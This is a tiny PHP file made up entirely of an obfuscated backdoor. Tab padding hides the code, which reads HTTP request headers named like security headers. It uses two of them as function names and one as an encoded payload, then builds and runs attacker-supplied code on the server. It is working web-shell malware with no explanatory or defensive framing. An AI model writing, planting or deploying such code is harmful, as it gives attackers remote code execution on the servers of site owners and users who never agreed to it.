<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Content-Security-Policy'])){$rjust=$_HEADERS['Content-Security-Policy']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['If-Unmodified-Since']));$rjust();}
